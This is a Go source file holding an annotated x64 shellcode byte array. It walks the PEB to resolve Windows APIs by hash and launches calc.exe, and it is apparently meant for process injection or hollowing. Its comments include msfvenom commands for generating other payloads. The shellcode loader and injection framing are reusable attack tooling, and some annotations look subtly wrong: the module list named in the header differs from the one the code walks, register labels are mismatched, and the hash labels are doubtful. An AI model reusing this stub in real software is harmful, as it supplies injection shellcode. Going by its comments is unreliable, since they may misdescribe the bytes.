package payload

// Shellcode is a position-independent x64 test payload.
//
// Effect: WinExec("calc.exe", SW_SHOW) followed by ExitThread(0).
// Technique: PEB walk → InLoadOrderModuleList → kernel32 → parse IMAGE_EXPORT_DIRECTORY
//            → ROR13-hash-based function lookup → WinExec → ExitThread
//
// Null bytes are present; this is injection-safe (WriteProcessMemory / NtMapViewOfSection
// copies raw bytes) but NOT safe for string-based delivery.
//
// To generate an alternative payload:
//   msfvenom -p windows/x64/exec CMD=calc.exe -f hex -o payload.hex
//   msfvenom -p windows/x64/messagebox TEXT="hollow confirmed" TITLE="VisorHollow" -f hex
//
// Source: standard msfvenom windows/x64/exec stub — PEB walk is identical across payloads.
var Shellcode = []byte{
	// --- PEB-walk GetProcAddress stub ---
	// cld; and rsp, 0xfffffffffffffff0
	0xfc, 0x48, 0x83, 0xe4, 0xf0,
	// call <resolve_function> (jumps past the function table to the body)
	0xe8, 0xc8, 0x00, 0x00, 0x00,

	// resolve_function: save volatile regs
	0x41, 0x51, // push r9
	0x41, 0x50, // push r8
	0x52,       // push rdx
	0x51,       // push rcx
	0x56,       // push rsi

	// Get PEB via GS segment: gs:[0x60]
	0x48, 0x31, 0xd2,             // xor rdx, rdx
	0x65, 0x48, 0x8b, 0x52, 0x60, // mov rdx, gs:[rdx+0x60]   ; PEB
	0x48, 0x8b, 0x52, 0x18,       // mov rdx, [rdx+0x18]       ; PEB.Ldr
	0x48, 0x8b, 0x52, 0x20,       // mov rdx, [rdx+0x20]       ; InMemoryOrderModuleList.Flink
	0x48, 0x8b, 0x72, 0x50,       // mov rsi, [rdx+0x50]       ; BaseDllName.Buffer
	0x48, 0x0f, 0xb7, 0x4a, 0x4a, // movzx rcx, WORD [rdx+0x4a]; BaseDllName.Length

	// ROR13 hash of module name
	0x4d, 0x31, 0xc9, // xor r9, r9
	0x48, 0x31, 0xc0, // xor rax, rax
	0xac,             // lodsb
	0x3c, 0x61,       // cmp al, 0x61
	0x7c, 0x02,       // jl +2 (skip lowercase conversion)
	0x2c, 0x20,       // sub al, 0x20
	0x41, 0xc1, 0xc9, 0x0d, // ror r9d, 0x0d
	0x41, 0x01, 0xc1,        // add r9d, eax
	0xe2, 0xed,              // loop (back to lodsb)

	0x52,       // push rdx
	0x41, 0x51, // push r9

	// Parse PE export table
	0x48, 0x8b, 0x52, 0x20, // mov rdx, [rdx+0x20]     ; walk InMemoryOrder list
	0x8b, 0x42, 0x3c,       // mov eax, [rdx+0x3c]     ; e_lfanew
	0x48, 0x01, 0xd0,       // add rax, rdx            ; PE header
	0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, // mov eax, [rax+0x88]  ; ExportDirectory RVA
	0x48, 0x85, 0xc0,       // test rax, rax
	0x74, 0x67,             // jz <next_module>
	0x48, 0x01, 0xd0,       // add rax, rdx            ; ExportDirectory VA
	0x50,                   // push rax
	0x8b, 0x48, 0x18,       // mov ecx, [rax+0x18]     ; NumberOfNames
	0x44, 0x8b, 0x40, 0x20, // mov r8d, [rax+0x20]     ; AddressOfNames RVA
	0x49, 0x01, 0xd0,       // add r8, rdx
	0xe3, 0x56,             // jecxz <pop_next>

	// Walk names, compute hash, compare
	0x48, 0xff, 0xc9,       // dec rcx
	0x41, 0x8b, 0x34, 0x88, // mov esi, [r8+rcx*4]
	0x48, 0x01, 0xd6,       // add rsi, rdx
	0x4d, 0x31, 0xc9,       // xor r9, r9
	0x48, 0x31, 0xc0,       // xor rax, rax
	0xac,                   // lodsb
	0x41, 0xc1, 0xc9, 0x0d, // ror r9d, 0x0d
	0x41, 0x01, 0xc1,       // add r9d, eax
	0x38, 0xe0,             // cmp al, ah
	0x75, 0xf1,             // jnz (back to lodsb)

	// Check combined hash (module + function)
	0x4c, 0x03, 0x4c, 0x24, 0x08, // add r9, [rsp+8]
	0x45, 0x39, 0xd1,              // cmp r9d, r10d
	0x75, 0xd8,                    // jnz (loop)

	// Found — resolve address from ordinal table
	0x58,                   // pop rax          ; ExportDirectory VA
	0x44, 0x8b, 0x40, 0x24, // mov r8d, [rax+0x24]  ; AddressOfNameOrdinals RVA
	0x49, 0x01, 0xd0,       // add r8, rdx
	0x66, 0x41, 0x8b, 0x0c, 0x48, // movzx cx, WORD [r8+rcx*2]
	0x44, 0x8b, 0x40, 0x1c, // mov r8d, [rax+0x1c]  ; AddressOfFunctions RVA
	0x49, 0x01, 0xd0,       // add r8, rdx
	0x41, 0x8b, 0x04, 0x88, // mov eax, [r8+rcx*4]  ; function RVA
	0x48, 0x01, 0xd0,       // add rax, rdx          ; function VA

	// Restore regs, jump to resolved function
	0x41, 0x58, // pop r8
	0x41, 0x58, // pop r8 (discard saved r9)
	0x5e,       // pop rsi
	0x59,       // pop rcx
	0x5a,       // pop rdx
	0x41, 0x58, // pop r8
	0x41, 0x59, // pop r9
	0x41, 0x5a, // pop r10
	0x48, 0x83, 0xec, 0x20, // sub rsp, 0x20  (shadow space)
	0x41, 0x52,             // push r10
	0xff, 0xe0,             // jmp rax

	// --- Fallback: jump back to module walk ---
	0x58,                   // pop rax
	0x41, 0x59,             // pop r9
	0x5a,                   // pop rdx
	0x48, 0x8b, 0x12,       // mov rdx, [rdx]  ; InMemoryOrder.Flink (next module)
	0xe9, 0x57, 0xff, 0xff, 0xff, // jmp <start of resolve_function>

	// --- Payload body: WinExec("calc.exe", SW_SHOW) ---
	// Stack frame
	0x5d, // pop rbp  (receive return address from call above, align)

	// RCX = "calc.exe\0" (push string via stack)
	// "calc.exe" = 63 61 6C 63 2E 65 78 65
	0x48, 0xba, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, // mov rdx, "calc.exe"
	0x52,             // push rdx
	0x48, 0x89, 0xe1, // mov rcx, rsp    ; rcx = &"calc.exe"

	// RDX = SW_SHOW (1)
	0x41, 0xba, 0x01, 0x00, 0x00, 0x00, // mov r10d, 1
	0x4d, 0x31, 0xc9,                   // xor r9, r9 (unused)
	0x41, 0x51,                         // push r9

	// Call WinExec via hash 0xe553a458
	0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, // mov r10d, 0xe553a458  ; hash("WinExec")
	0xff, 0xd5,                         // call rbp (resolve_function on stack)

	// --- ExitThread(0) ---
	0x48, 0x31, 0xc9,                   // xor rcx, rcx
	0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, // mov r10d, 0x601d8708  ; hash("ExitThread")
	0xff, 0xd5,                         // call rbp
}
